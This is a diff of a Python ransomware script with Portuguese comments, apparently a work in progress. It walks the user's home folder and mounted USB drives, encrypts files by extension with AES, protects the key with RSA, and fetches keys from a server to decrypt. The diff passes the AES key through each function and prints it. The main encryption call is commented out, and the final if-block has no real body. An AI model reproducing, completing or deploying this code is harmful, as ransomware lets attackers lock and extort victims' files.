@@ -22,26 +22,26 @@ texto='''
 '''
 
 # ponto de partida da criptografia
-def menu(modo):
+def menu(senha_AES,modo):
     # caminho de partida
     home=os.environ['HOME']
     # lista com os tipos
     f=open('tipos_arquivos.txt','r')
     tipos=f.read()
     tipos=tipos.split('\n')
-    listar(home,tipos,modo)
-    listar_media(modo,tipos)
+    listar(senha_AES,home,tipos,modo)
+    listar_media(senha_AES,modo,tipos)
 
 
-def listar_media(modo,tipos_arq):
+def listar_media(senha_AES,modo,tipos_arq):
     print('Procurando por pendrives/HDs')
     caminho='/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
-        listar(caminho,tipos_arq,modo)
+        listar(senha_AES,caminho,tipos_arq,modo)
 
 
 
-def listar(diretorio, tipos_arq, modo):
+def listar(chave_AES,diretorio, tipos_arq, modo):
     if(modo==1): # criptografa
         for caminho, diretorio, arquivo in os.walk(diretorio):
             for arq in arquivo:
@@ -51,7 +51,7 @@ def listar(diretorio, tipos_arq, modo):
                     if(extensao[1]==ext):
                         a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                         try:
-                            criptografa(a)
+                            criptografa(chave_AES,a)
                         except:
                             print('erro ao criptografar-> ' +str(a))
 
@@ -62,7 +62,7 @@ def listar(diretorio, tipos_arq, modo):
                 extensao=os.path.splitext(a)
                 if(extensao[1]=='.cripto'):
                     a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                    descriptografa(a)
+                    descriptografa(chave_AES,a)
 
 
 def client(IP_serv):
@@ -103,13 +103,13 @@ def gera_chave_AES():
 def crypto_all():
     ## IGNORAR ARQUIVOS DO RANSOM
     AES_key=gera_chave_AES()
+    print(AES_key)
     print('[*] chave AES gerada')
-    #menu(1) # -> criptografa tudo
+    #menu(AES_key,1) # -> criptografa tudo
     AES_to_RSA()
     print('[*] senha AES criptografado com chave RSA')
     RSA_to_SRSA()
     print('[*] chave privada do cliente criptografada')
-    # criar arquivo
 
 def decrypt_all():
     client('localhost')
@@ -117,7 +117,12 @@ def decrypt_all():
     print('[*] chave privada do cliente descriptografada')
     RSA_to_AES()
     print('[*] chave AES descriptografada')
-    #menu(2)
+
+    f=open('keys/AES.txt','r')
+    a=f.read()
+    tam=len(a)
+    if(tam==30):
+        #menu(a,2)
 
 crypto_all()
 decrypt_all()
